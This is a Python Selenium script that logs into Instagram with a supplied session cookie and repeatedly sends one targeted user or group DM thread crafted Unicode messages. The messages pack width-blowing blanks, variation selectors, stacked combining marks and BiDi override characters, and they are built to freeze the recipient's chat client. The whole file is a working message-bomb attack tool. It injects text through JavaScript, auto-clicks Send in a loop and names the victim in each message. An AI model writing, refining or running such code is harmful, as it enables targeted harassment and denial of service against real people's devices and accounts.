# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (DESKTOP-CRUSHER V15)
# 📅 STATUS: MAIN-THREAD LOCK | x15 DENSITY | 10-AGENT BLITZ

import os, time, random, threading, sys, gc, tempfile
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- MATRIX CONFIG ---
THREADS = 2
SESSION_LIMIT = 300 # Longer session for total memory exhaustion
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_desktop_crusher_payload(target_name):
    """The Desktop-Crusher: Forces Reflow-Loops & UI Thread Lock."""
    # 💥 THE 'LAYOUT BLIND' (Horizontal expansion)
    # Forces the desktop chat window to calculate an impossible width.
    width_bomb = "\u2800\u00A0" * 150 
    
    # 💥 THE 'REFRESH-TRAP' (Variation Selector-16)
    # Forces the browser to check for 'color' glyphs for every character.
    color_trap = "\ufe0f" * 50
    
    # 💥 DENSITY x15 (150 marks per character)
    # Pushes the GPU and Layout engine to the absolute limit.
    z_tower = "̸" * 150
    
    header = f"👑 𝖯𝖱𝖠𝖵𝖤𝖤𝖱 𝖯𝖠𝖯𝖠 👑 DESKTOP_LOCKDOWN: {target_name.upper()}\n"
    
    lines = [header, width_bomb, color_trap]
    
    for i in range(70):
        # BiDi Recursion to hang the Windows/Linux/MacOS text engine
        prefix = "\u202E\u2066" if i % 2 == 0 else "\u202D\u2067"
        lines.append(f"{width_bomb}{prefix}{target_name.upper()}_FREEZE{z_tower}")
        
    return "\n".join(lines)[:9980]

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            print(f"[M{MACHINE_ID}-A{agent_id}] ⚡ DESKTOP-CRUSHER DEPLOYED...", flush=True)
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(7)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    payload = get_desktop_crusher_payload(target_name)
                    
                    # 🔥 DIRECT JS INJECTION (Bypasses Runner Lag)
                    driver.execute_script("""
                        var box = document.querySelector('div[role="textbox"]') || document.querySelector('textarea');
                        if (box) {
                            box.focus();
                            document.execCommand('insertText', false, arguments[0]);
                            box.dispatchEvent(new Event('input', { bubbles: true }));
                            
                            // Aggressive Send Click
                            var btns = document.querySelectorAll('div[role="button"]');
                            for(var b of btns) {
                                if(b.innerText.includes("Send") || b.innerText.includes("ပို့မည်")) {
                                    b.click();
                                }
                            }
                        }
                    """, payload)
                    
                    print(f"[M{MACHINE_ID}-A{agent_id}] 💀 DESKTOP LOCKED", flush=True)
                    time.sleep(random.uniform(0.1, 0.4)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
